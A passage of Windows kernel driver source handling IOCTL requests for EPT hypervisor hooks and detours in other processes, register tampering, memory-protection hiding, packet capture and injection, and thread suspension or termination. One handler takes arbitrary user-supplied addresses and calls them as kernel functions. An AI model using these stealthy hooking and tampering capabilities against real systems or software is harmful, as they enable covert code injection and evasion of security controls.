	*info = sizeof(EptHookInstallResponse);
	return status;
}

NTSTATUS HandleEptHookRemove(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "EPT Hook remove request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;

	if (inputLen < sizeof(EptHookRemoveRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (EptHookRemoveRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	return UsermodeEptHook_Remove(request->HookIndex);
}

NTSTATUS HandleEptHookList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (outputLen < sizeof(EptHookListResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto response = (EptHookListResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
		return STATUS_INVALID_PARAMETER;

	RtlZeroMemory(response, sizeof(EptHookListResponse));

	UsermodeEptHookEntry entries[MAX_EPT_HOOK_LIST_ENTRIES] = { 0 };
	ULONG slotIndices[MAX_EPT_HOOK_LIST_ENTRIES] = { 0 };
	ULONG count = 0;

	NTSTATUS status = UsermodeEptHook_GetList(entries, slotIndices, &count, MAX_EPT_HOOK_LIST_ENTRIES);
	if (!NT_SUCCESS(status))
		return status;

	response->Count = count;
	for (ULONG i = 0; i < count; i++)
	{
		response->Entries[i].ProcessId = entries[i].ProcessId;
		response->Entries[i].TargetVirtualAddress = entries[i].TargetVirtualAddress;
		response->Entries[i].PatchSize = entries[i].PatchSize;
		response->Entries[i].HookIndex = slotIndices[i];
		response->Entries[i].Active = TRUE;
	}

	*info = sizeof(EptHookListResponse);
	return STATUS_SUCCESS;
}

NTSTATUS HandleEptHookInstallDetour(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "EPT Hook install detour request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(EptHookDetourRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(EptHookInstallResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (EptHookDetourRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->DetourCodeSize == 0 || request->DetourCodeSize > MAX_EPT_HOOK_DETOUR_SIZE)
		return STATUS_INVALID_PARAMETER;

	if (request->StolenBytes < 5)
		return STATUS_INVALID_PARAMETER;

	ULONG hookIndex = 0;
	NTSTATUS status = UsermodeEptHook_InstallDetour(
		request->ProcessId,
		request->TargetVirtualAddress,
		request->StolenBytes,
		request->DetourPageOffset,
		(PVOID)request->DetourCode,
		request->DetourCodeSize,
		&hookIndex
	);

	auto response = (EptHookInstallResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (NT_SUCCESS(status))
	{
		response->HookIndex = hookIndex;
		response->Success = TRUE;
	}
	else
	{
		response->HookIndex = 0;
		response->Success = FALSE;
	}

	*info = sizeof(EptHookInstallResponse);
	return status;
}

// ============== Register Change Handlers ==============

NTSTATUS HandleRegChangeInstall(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Register Change install request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(RegChangeInstallRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(RegChangeInstallResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (RegChangeInstallRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->RegIndex > 21)
		return STATUS_INVALID_PARAMETER;

	ULONG entryIndex = 0;
	NTSTATUS status = RegisterChange_Install(
		request->ProcessId,
		request->TargetAddress,
		request->RegIndex,
		request->NewValue,
		&entryIndex
	);

	auto response = (RegChangeInstallResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (NT_SUCCESS(status))
	{
		response->EntryIndex = entryIndex;
		response->Success = TRUE;
	}
	else
	{
		response->EntryIndex = 0;
		response->Success = FALSE;
	}

	*info = sizeof(RegChangeInstallResponse);
	return status;
}

NTSTATUS HandleRegChangeRemove(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "Register Change remove request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;

	if (inputLen < sizeof(RegChangeRemoveRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (RegChangeRemoveRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	return RegisterChange_Remove(request->EntryIndex);
}

NTSTATUS HandleRegChangeList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (outputLen < sizeof(RegChangeListResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto response = (RegChangeListResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
		return STATUS_INVALID_PARAMETER;

	RtlZeroMemory(response, sizeof(RegChangeListResponse));

	RegChangeTrackingEntry entries[MAX_REG_CHANGES] = { 0 };
	ULONG slotIndices[MAX_REG_CHANGES] = { 0 };
	ULONG count = 0;

	NTSTATUS status = RegisterChange_GetList(entries, slotIndices, &count, MAX_REG_CHANGES);
	if (!NT_SUCCESS(status))
		return status;

	response->Count = count;
	for (ULONG i = 0; i < count; i++)
	{
		response->Entries[i].ProcessId = entries[i].ProcessId;
		response->Entries[i].TargetAddress = entries[i].TargetVirtualAddress;
		response->Entries[i].RegIndex = entries[i].RegIndex;
		response->Entries[i].NewValue = entries[i].NewValue;
		response->Entries[i].EntryIndex = slotIndices[i];
		response->Entries[i].Active = TRUE;
	}

	*info = sizeof(RegChangeListResponse);
	return STATUS_SUCCESS;
}

NTSTATUS HandleRegChangeRemoveAll(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);

	return RegisterChange_RemoveAll();
}

// ============== Memory Protection Hiding Handler ==============

NTSTATUS HandleHideMemory(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(HideMemoryRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HideMemoryRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	return HideMemorySetProtection(request->ProcessId, request->VirtualAddress, request->Protection);
}

// ============== Packet Capture Handlers (WFP) ==============

NTSTATUS HandlePacketStartCapture(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(PacketCaptureStartRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (PacketCaptureStartRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	return WfpStartCapture(request->TargetPid);
}

NTSTATUS HandlePacketStopCapture(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);

	return WfpStopCapture();
}

NTSTATUS HandlePacketGetPackets(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(CapturedPacketData))
		return STATUS_BUFFER_TOO_SMALL;

	auto buffer = Irp->AssociatedIrp.SystemBuffer;
	if (!buffer)
		return STATUS_INVALID_PARAMETER;

	ULONG bytesWritten = 0;
	NTSTATUS status = WfpGetCapturedPackets(buffer, outputLen, &bytesWritten);

	*info = bytesWritten;
	return status;
}

NTSTATUS HandlePacketInject(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(CapturedPacketData))
		return STATUS_BUFFER_TOO_SMALL;

	auto packet = (CapturedPacket*)Irp->AssociatedIrp.SystemBuffer;
	if (!packet)
		return STATUS_INVALID_PARAMETER;

	return WfpInjectPacket(packet);
}

NTSTATUS HandlePacketAddFilter(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(PacketFilterRuleData))
		return STATUS_BUFFER_TOO_SMALL;

	auto data = (PacketFilterRuleData*)Irp->AssociatedIrp.SystemBuffer;
	if (!data)
		return STATUS_INVALID_PARAMETER;

	// Convert from wire format to internal format
	PacketFilterRule rule;
	rule.Enabled = data->Enabled != 0;
	rule.Action = (PacketFilterAction)data->Action;
	rule.Port = data->Port;
	rule.IpAddress = data->IpAddress;
	rule.Protocol = (PacketProtocol)data->Protocol;

	return WfpAddFilterRule(&rule);
}

NTSTATUS HandlePacketRemoveFilter(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(PacketFilterRemoveRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (PacketFilterRemoveRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	return WfpRemoveFilterRule(request->Index);
}

NTSTATUS HandlePacketClearFilters(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);

	return WfpClearFilterRules();
}

NTSTATUS HandlePacketClearBuffer(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);

	return WfpClearPacketBuffer();
}

NTSTATUS HandlePacketGetState(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(PacketCaptureStateResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto response = (PacketCaptureStateResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
		return STATUS_INVALID_PARAMETER;

	NTSTATUS status = WfpGetCaptureState(
		&response->IsCapturing,
		&response->TargetPid,
		&response->PacketCount,
		&response->DroppedCount
	);

	*info = sizeof(PacketCaptureStateResponse);
	return status;
}

// ============== Kernel Process/Thread Control Handlers ==============

// System information structures for ZwQuerySystemInformation
typedef struct _SYSTEM_THREAD_INFORMATION_LOCAL {
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitches;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION_LOCAL, *PSYSTEM_THREAD_INFORMATION_LOCAL;

typedef struct _SYSTEM_PROCESS_INFORMATION_LOCAL {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG NumberOfThreadsHighWatermark;
	ULONGLONG CycleTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR UniqueProcessKey;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	SYSTEM_THREAD_INFORMATION_LOCAL Threads[1];
} SYSTEM_PROCESS_INFORMATION_LOCAL, *PSYSTEM_PROCESS_INFORMATION_LOCAL;

// Undocumented kernel APIs for process/thread control
extern "C" {
	NTKERNELAPI NTSTATUS PsSuspendProcess(PEPROCESS Process);
	NTKERNELAPI NTSTATUS PsResumeProcess(PEPROCESS Process);
	NTSYSCALLAPI NTSTATUS NTAPI ZwQuerySystemInformation(
		ULONG SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);
	NTSYSCALLAPI NTSTATUS NTAPI ZwOpenThread(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes,
		CLIENT_ID* ClientId
	);
}

// Function pointer types for dynamically resolved APIs
typedef NTSTATUS(NTAPI* PFN_PsSuspendThread)(PETHREAD Thread, PULONG PreviousSuspendCount);
typedef NTSTATUS(NTAPI* PFN_PsResumeThread)(PETHREAD Thread, PULONG PreviousSuspendCount);
typedef NTSTATUS(NTAPI* PFN_ZwTerminateThread)(HANDLE ThreadHandle, NTSTATUS ExitStatus);

// Global function pointers (resolved at runtime)
static PFN_PsSuspendThread g_PsSuspendThread = nullptr;
static PFN_PsResumeThread g_PsResumeThread = nullptr;
static PFN_ZwTerminateThread g_ZwTerminateThread = nullptr;
static BOOLEAN g_ThreadApisResolved = FALSE;
static PVOID g_ThreadApiAddresses[3] = { nullptr, nullptr, nullptr };

// Set thread API addresses from usermode (resolved via PDB)
NTSTATUS HandleSetThreadApiAddresses(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleSetThreadApiAddresses called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(SetThreadApiAddressesRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (SetThreadApiAddressesRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	if (request->PsSuspendThreadAddress)
		g_PsSuspendThread = (PFN_PsSuspendThread)(PVOID)request->PsSuspendThreadAddress;
	if (request->PsResumeThreadAddress)
		g_PsResumeThread = (PFN_PsResumeThread)(PVOID)request->PsResumeThreadAddress;
	if (request->ZwTerminateThreadAddress)
		g_ZwTerminateThread = (PFN_ZwTerminateThread)(PVOID)request->ZwTerminateThreadAddress;

	KdPrint((DRIVER_PREFIX "Thread APIs set: Suspend=%p, Resume=%p, Terminate=%p\n",
		g_PsSuspendThread, g_PsResumeThread, g_ZwTerminateThread));

	g_ThreadApisResolved = TRUE;
	return STATUS_SUCCESS;
}

// Resolve thread control APIs dynamically (fallback)
static BOOLEAN ResolveThreadApis()
{
	if (g_ThreadApisResolved)
		return TRUE;

	UNICODE_STRING funcName;

	// Try Zw* versions first (may not be exported on all Windows versions)
	RtlInitUnicodeString(&funcName, L"ZwSuspendThread");
	PVOID zwSuspend = MmGetSystemRoutineAddress(&funcName);
	if (zwSuspend)
		g_PsSuspendThread = (PFN_PsSuspendThread)zwSuspend;

	RtlInitUnicodeString(&funcName, L"ZwResumeThread");
	PVOID zwResume = MmGetSystemRoutineAddress(&funcName);
	if (zwResume)
		g_PsResumeThread = (PFN_PsResumeThread)zwResume;

	RtlInitUnicodeString(&funcName, L"ZwTerminateThread");
	g_ZwTerminateThread = (PFN_ZwTerminateThread)MmGetSystemRoutineAddress(&funcName);

	g_ThreadApisResolved = TRUE;

	KdPrint((DRIVER_PREFIX "Thread APIs resolved: Suspend=%p, Resume=%p, Terminate=%p\n",
		g_PsSuspendThread, g_PsResumeThread, g_ZwTerminateThread));

	return (g_PsSuspendThread != nullptr || g_PsResumeThread != nullptr || g_ZwTerminateThread != nullptr);
}

#define LOCAL_SystemProcessInformation 5

NTSTATUS HandleSuspendProcess(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleSuspendProcess called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(ProcessControlRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (ProcessControlRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->ProcessId == 0 || request->ProcessId == 4)
		return STATUS_INVALID_PARAMETER;

	PEPROCESS process = nullptr;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &process);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed: 0x%X\n", status));
		return status;
	}

	status = PsSuspendProcess(process);
	ObDereferenceObject(process);

	KdPrint((DRIVER_PREFIX "PsSuspendProcess for PID %d: 0x%X\n", request->ProcessId, status));
	return status;
}

NTSTATUS HandleResumeProcess(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleResumeProcess called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(ProcessControlRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (ProcessControlRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->ProcessId == 0 || request->ProcessId == 4)
		return STATUS_INVALID_PARAMETER;

	PEPROCESS process = nullptr;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &process);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed: 0x%X\n", status));
		return status;
	}

	status = PsResumeProcess(process);
	ObDereferenceObject(process);

	KdPrint((DRIVER_PREFIX "PsResumeProcess for PID %d: 0x%X\n", request->ProcessId, status));
	return status;
}

NTSTATUS HandleSuspendThread(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleSuspendThread called\n"));

	ResolveThreadApis();
	
	if (!g_PsSuspendThread)
	{
		KdPrint((DRIVER_PREFIX "PsSuspendThread not available\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(ThreadControlRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (ThreadControlRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->ThreadId == 0)
		return STATUS_INVALID_PARAMETER;

	PETHREAD thread = nullptr;
	NTSTATUS status = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)request->ThreadId, &thread);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupThreadByThreadId failed: 0x%X\n", status));
		return status;
	}

	ULONG previousCount = 0;
	status = g_PsSuspendThread(thread, &previousCount);
	ObDereferenceObject(thread);

	KdPrint((DRIVER_PREFIX "PsSuspendThread for TID %d: 0x%X (prev count: %d)\n", request->ThreadId, status, previousCount));
	return status;
}

NTSTATUS HandleResumeThread(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleResumeThread called\n"));

	ResolveThreadApis();
	
	if (!g_PsResumeThread)
	{
		KdPrint((DRIVER_PREFIX "PsResumeThread not available\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(ThreadControlRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (ThreadControlRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->ThreadId == 0)
		return STATUS_INVALID_PARAMETER;

	PETHREAD thread = nullptr;
	NTSTATUS status = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)request->ThreadId, &thread);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupThreadByThreadId failed: 0x%X\n", status));
		return status;
	}

	ULONG previousCount = 0;
	status = g_PsResumeThread(thread, &previousCount);
	ObDereferenceObject(thread);

	KdPrint((DRIVER_PREFIX "PsResumeThread for TID %d: 0x%X (prev count: %d)\n", request->ThreadId, status, previousCount));
	return status;
}

NTSTATUS HandleTerminateThread(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleTerminateThread called\n"));

	if (!ResolveThreadApis() || !g_ZwTerminateThread)
	{
		KdPrint((DRIVER_PREFIX "ZwTerminateThread not available\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(ThreadControlRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (ThreadControlRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->ThreadId == 0)
		return STATUS_INVALID_PARAMETER;

	// Open thread handle for termination
	HANDLE threadHandle = nullptr;
	OBJECT_ATTRIBUTES objAttr;
	CLIENT_ID clientId;
	clientId.UniqueProcess = nullptr;
	clientId.UniqueThread = (HANDLE)(ULONG_PTR)request->ThreadId;
	InitializeObjectAttributes(&objAttr, nullptr, OBJ_KERNEL_HANDLE, nullptr, nullptr);

	NTSTATUS status = ZwOpenThread(&threadHandle, THREAD_TERMINATE, &objAttr, &clientId);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "ZwOpenThread failed: 0x%X\n", status));
		return status;
	}

	status = g_ZwTerminateThread(threadHandle, STATUS_SUCCESS);
	ZwClose(threadHandle);

	KdPrint((DRIVER_PREFIX "ZwTerminateThread for TID %d: 0x%X\n", request->ThreadId, status));
	return status;
}

NTSTATUS HandleSetEthreadOffsets(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleSetEthreadOffsets called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(SetEthreadOffsetsRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (SetEthreadOffsetsRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	// Validate offsets are reasonable
	if (request->Win32StartAddressOffset > 0x1000 || request->StateOffset > 0x1000 || request->WaitReasonOffset > 0x1000)
	{
		KdPrint((DRIVER_PREFIX "Invalid ETHREAD offsets\n"));
		return STATUS_INVALID_PARAMETER;
	}

	g_EthreadOffsets.Win32StartAddressOffset = request->Win32StartAddressOffset;
	g_EthreadOffsets.StateOffset = request->StateOffset;
	g_EthreadOffsets.WaitReasonOffset = request->WaitReasonOffset;
	g_EthreadOffsets.IsInitialized = TRUE;

	KdPrint((DRIVER_PREFIX "ETHREAD offsets set: Win32StartAddress=0x%X, State=0x%X, WaitReason=0x%X\n",
		request->Win32StartAddressOffset, request->StateOffset, request->WaitReasonOffset));

	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumSystemThreads(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "HandleEnumSystemThreads called\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumSystemThreadsResponse) + (MAX_SYSTEM_THREADS - 1) * sizeof(SystemThreadInfo);
	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small: %d < %d\n", outputLen, requiredSize));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumSystemThreadsResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
		return STATUS_INVALID_PARAMETER;

	RtlZeroMemory(response, requiredSize);
	response->Count = 0;

	// Get System process (PID 4)
	PEPROCESS systemProcess = nullptr;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)4, &systemProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to get System process: 0x%X\n", status));
		return status;
	}

	// Get offsets
	ULONG win32StartOffset = g_EthreadOffsets.IsInitialized ? g_EthreadOffsets.Win32StartAddressOffset : 0x620;
	ULONG stateOffset = g_EthreadOffsets.IsInitialized ? g_EthreadOffsets.StateOffset : 0x184;
	ULONG waitReasonOffset = g_EthreadOffsets.IsInitialized ? g_EthreadOffsets.WaitReasonOffset : 0x185;

	__try
	{
		// Use NtQuerySystemInformation to enumerate threads
		ULONG bufferSize = 0x100000; // 1MB
		PVOID buffer = ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'thrD');
		if (!buffer)
		{
			ObDereferenceObject(systemProcess);
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		status = ZwQuerySystemInformation(LOCAL_SystemProcessInformation, buffer, bufferSize, nullptr);
		if (!NT_SUCCESS(status))
		{
			ExFreePoolWithTag(buffer, 'thrD');
			ObDereferenceObject(systemProcess);
			return status;
		}

		// Find System process in the list
		PSYSTEM_PROCESS_INFORMATION_LOCAL procInfo = (PSYSTEM_PROCESS_INFORMATION_LOCAL)buffer;
		while (procInfo)
		{
			if ((ULONG)(ULONG_PTR)procInfo->UniqueProcessId == 4)
			{
				// Found System process, enumerate its threads
				PSYSTEM_THREAD_INFORMATION_LOCAL threadInfo = procInfo->Threads;
				
				for (ULONG i = 0; i < procInfo->NumberOfThreads && response->Count < MAX_SYSTEM_THREADS; i++)
				{
					ULONG tid = (ULONG)(ULONG_PTR)threadInfo[i].ClientId.UniqueThread;
					
					// Get ETHREAD to read Win32StartAddress
					PETHREAD thread = nullptr;
					if (NT_SUCCESS(PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)tid, &thread)))
					{
						SystemThreadInfo* entry = &response->Threads[response->Count];
						entry->ThreadId = tid;
						entry->StartAddress = (ULONG64)threadInfo[i].StartAddress;
						
						// Read Win32StartAddress from ETHREAD
						if (MmIsAddressValid((PVOID)((PUCHAR)thread + win32StartOffset)))
						{
							entry->Win32StartAddress = *(PULONG64)((PUCHAR)thread + win32StartOffset);
						}
						
						// Read State and WaitReason
						if (MmIsAddressValid((PVOID)((PUCHAR)thread + stateOffset)))
						{
							entry->State = *(PUCHAR)((PUCHAR)thread + stateOffset);
						}
						if (MmIsAddressValid((PVOID)((PUCHAR)thread + waitReasonOffset)))
						{
							entry->WaitReason = *(PUCHAR)((PUCHAR)thread + waitReasonOffset);
						}
						
						// Resolve driver name for Win32StartAddress
						ULONG64 addr = entry->Win32StartAddress ? entry->Win32StartAddress : entry->StartAddress;
						if (addr)
						{
							// Initialize AuxKlib first
							if (!NT_SUCCESS(AuxKlibInitialize()))
							{
								ObDereferenceObject(thread);
								response->Count++;
								continue;
							}

							// Find which driver owns this address
							PAUX_MODULE_EXTENDED_INFO modules = nullptr;
							ULONG moduleSize = 0;
							if (NT_SUCCESS(AuxKlibQueryModuleInformation(&moduleSize, sizeof(AUX_MODULE_EXTENDED_INFO), nullptr)) && moduleSize > 0)
							{
								modules = (PAUX_MODULE_EXTENDED_INFO)ExAllocatePoolWithTag(NonPagedPool, moduleSize, 'modD');
								if (modules && NT_SUCCESS(AuxKlibQueryModuleInformation(&moduleSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules)))
								{
									ULONG moduleCount = moduleSize / sizeof(AUX_MODULE_EXTENDED_INFO);
									for (ULONG m = 0; m < moduleCount; m++)
									{
										ULONG64 base = (ULONG64)modules[m].BasicInfo.ImageBase;
										ULONG64 end = base + modules[m].ImageSize;
										if (addr >= base && addr < end)
										{
											// Found the module
											entry->DriverBase = base;
											entry->DriverOffset = addr - base;
											
											// Copy module name
											PCHAR fileName = (PCHAR)modules[m].FullPathName + modules[m].FileNameOffset;
											size_t len = strlen(fileName);
											if (len >= MAX_MODULE_NAME_LENGTH) len = MAX_MODULE_NAME_LENGTH - 1;
											RtlCopyMemory(entry->DriverName, fileName, len);
											entry->DriverName[len] = '\0';
											break;
										}
									}
								}
								if (modules) ExFreePoolWithTag(modules, 'modD');
							}
						}
						
						ObDereferenceObject(thread);
						response->Count++;
					}
				}
				break;
			}

			if (procInfo->NextEntryOffset == 0)
				break;
			procInfo = (PSYSTEM_PROCESS_INFORMATION_LOCAL)((PUCHAR)procInfo + procInfo->NextEntryOffset);
		}

		ExFreePoolWithTag(buffer, 'thrD');
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		ObDereferenceObject(systemProcess);
		return STATUS_ACCESS_VIOLATION;
	}

	ObDereferenceObject(systemProcess);
	*info = sizeof(EnumSystemThreadsResponse) + (response->Count > 0 ? (response->Count - 1) * sizeof(SystemThreadInfo) : 0);
	
	KdPrint((DRIVER_PREFIX "Enumerated %d system threads\n", response->Count));
	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumAllKernelThreads(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "HandleEnumAllKernelThreads called\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumAllKernelThreadsResponse) + (MAX_KERNEL_THREADS - 1) * sizeof(KernelThreadInfo);
	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small: %d < %d\n", outputLen, requiredSize));
		return STATUS_BUFFER_TOO_SMALL;
